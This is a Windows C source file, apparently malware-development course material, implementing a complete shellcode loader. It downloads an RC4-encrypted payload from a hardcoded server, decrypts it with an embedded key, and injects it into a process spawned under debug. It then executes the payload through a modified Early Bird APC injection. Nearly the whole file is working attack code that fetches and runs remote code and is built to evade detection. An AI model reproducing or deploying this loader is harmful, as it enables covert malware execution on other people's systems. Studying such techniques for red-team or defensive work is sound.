#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <Tlhelp32.h>

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

//TARGET_PROCESS will be searched in C:\Windows\system32 because of GetEnvironmentVariableA. If we want other path, we would need to get another path from function
#define TARGET_PROCESS "hvix64.exe"

//Payload to download from our server
#define PAYLOAD L"http://192.168.0.122/output.bin"

//Implemented:
//Logic - Modified Early Bird APC Injection (2):
//0. Download the shellcode from out server
//1. Decipher the encrypted payload
//2. Use CreateProcess with DEBUG_PROCESS flag instead of SUSPENDED (attaching the debugger which is our malware)
//3. Inject payload into target process address space
//4. Get the debugged thread's handle from CreateProcess along with the payload's base address and pass them to QueueUserAPC
//5. Detach the target process with DebugActiveProcessStop to stop and remove the debugger and also resume the thread and execute payload

//hardcoded key to decipher Rc4 payload
unsigned char Rc4Key[] = {
        0x10, 0x27, 0x3B, 0x62, 0x79, 0x82, 0xAA, 0xDA, 0x02, 0x4F, 0x50, 0x05, 0x6A, 0x9C, 0x0F, 0x0F };

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
                hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL; 	 			        // Used as the total payload size
    PBYTE		pBytes = NULL,					    // Used as the total payload heap buffer
                pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

    hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; 
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}

typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {


    NTSTATUS        STATUS = NULL;

    USTRING Key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
            Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    //Clean the structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    //set the size of structure
    Si.cb = sizeof(STARTUPINFO);

    //get the %windir& env var path 
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //create the target process path for CreateProcessA
    //example: if windir is C:\Windows, it will look for TARGET_PROCESS in C:\Windows\system32
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    //create the process
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //fill up the OUTPUT params with CreateProcessA outpuit
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    //checks
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    PBYTE Rc4CipherText = NULL;
    SIZE_T sRc4CipherText = NULL;

    //download the shellcode
    if (!GetPayloadFromUrl(PAYLOAD, &Rc4CipherText, &sRc4CipherText)) {
        printf("[!] GetPayloadFromUrl failed with error: %d\n", GetLastError());
        return -1;
    }

    //decipher the payload
    if (!Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sRc4CipherText)) {
        printf("[!] Rc4EncryptionViSystemFunc032 failed with error: %d\n", GetLastError());
        return -1;
    }

    //create target remote process in debugged state
    if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        printf("[!] CreateSuspendedProcess2 failed with error: %d\n", GetLastError());
        return -1;
    }

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, Rc4CipherText, sRc4CipherText, &pAddress)) {
        printf("[!] InjectShellcodeToRemoteProcess failed with error: %d\n", GetLastError());
        return -1;
    }
    //queue the APC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}

